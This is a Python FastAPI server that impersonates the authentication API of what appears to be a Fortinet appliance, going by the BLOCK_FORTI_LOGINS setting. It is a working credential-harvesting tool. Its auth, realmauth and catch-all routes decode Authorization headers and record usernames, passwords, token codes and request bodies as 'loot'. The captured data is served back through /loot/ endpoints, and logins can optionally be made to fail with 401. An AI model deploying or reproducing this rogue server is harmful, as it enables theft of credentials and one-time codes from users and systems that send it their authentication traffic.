import os
import base64
from datetime import datetime
from typing import Annotated
from pydantic import BaseModel, Field
from fastapi import FastAPI, Header, Request
from fastapi.staticfiles import StaticFiles

block_logins = os.getenv("BLOCK_FORTI_LOGINS")

response_code = 200

if block_logins == "True" or block_logins == "T":
    response_code = 401

app = FastAPI()

app.mount("/ui", StaticFiles(directory="ui", html=True), name="ui")


class BaseRequest(BaseModel):
    timestamp: datetime = Field(default_factory=datetime.now)


class AuthRequest(BaseRequest):
    username: str
    password: str | None = None
    token_code: str | None = None
    realm: str | None = None


class CatchAllRequest(BaseRequest):
    path_name: str
    body: str | None = None


# arrays to hold captured loot
auth_headers = []
auth_requests = []
catch_all_requests = []


@app.get("/")
async def root():
    return {"message": "Hello World"}


# function to decode the authentication header
def decode_auth_header(authorization: str):
    # split the authentication header at the first space
    # to get the authentication type and the token
    auth_type, token = authorization.split(" ", 1)

    # decode the base64 encoded token
    decoded_token = base64.b64decode(token).decode("utf-8")

    # if token is not already in the auth_headers array then add it
    if decoded_token not in auth_headers:
        auth_headers.append(decoded_token)

        # print the decoded token
        print(f"new authentication header: {decoded_token}")
        print(f"auth_headers: {auth_headers}")

    # return the decoded token
    return decoded_token


# handle auth requests
@app.post("/api/v1/auth/", status_code=response_code)
async def realmauth(
    auth_request: AuthRequest, authorization: Annotated[str | None, Header()] = None
):
    # decode the auth header
    decode_auth_header(authorization)

    # print the auth request
    print(f"auth request: {auth_request}")

    # add auth request to the auth_requests array
    auth_requests.append(auth_request)

    return


# handle realmauth requests
@app.post("/api/v1/realmauth/", status_code=response_code)
async def realmauth(
    auth_request: AuthRequest,
    authorization: Annotated[str | None, Header()] = None,
):
    # decode the auth header
    decode_auth_header(authorization)

    # print the auth request
    print(f"auth request: {auth_request}")

    # add auth request to the auth_requests array
    auth_requests.append(auth_request)

    return


# route for requesting loot
@app.get("/loot/", status_code=response_code)
async def loot():
    # return the loot as a json object
    return {
        "auth_headers": auth_headers,
        "auth_requests": auth_requests,
        "catch_all_requests": catch_all_requests,
    }


# route for requesting auth headers
@app.get("/loot/headers/", status_code=response_code)
async def loot_headers():
    # return the auth headers as a json object
    return {"auth_headers": auth_headers}


# route for requesting auth requests
@app.get("/loot/auth/", status_code=response_code)
async def loot_auth_requests():
    # return the auth requests as a json object
    return {"auth_requests": auth_requests}


# route for requesting catch all requests
@app.get("/loot/catch_all/", status_code=response_code)
async def loot_catch_all_requests():
    # return the catch all requests as a json object
    return {"catch_all_requests": catch_all_requests}


# catch all route
# this can at least grab the auth header from any other random request
@app.api_route(
    "/api/v1/{path_name:path}",
    methods=["GET", "POST", "PUT", "DELETE"],
    status_code=response_code,
)
async def catch_all(
    request: Request,
    path_name: str,
    authorization: Annotated[str | None, Header()] = None,
):
    catch_all_request = CatchAllRequest(path_name=path_name)

    # print the path name
    print(f"catch all route path name: {path_name}")

    # if there is an authorization header then decode it
    if authorization:
        decode_auth_header(authorization)

    # if there is a body and it isnt empty print it
    if request.body:
        body = await request.body()
        if body != b"":
            print(f"body: {body}")
            catch_all_request.body = body

    # if there are GET parameters print them
    if request.query_params:
        query_params_str = str(request.query_params)
        print(f"query_params: {query_params_str}")
        catch_all_request.body = query_params_str

    # add the catch all request to the catch_all_requests array
    catch_all_requests.append(catch_all_request)

    return
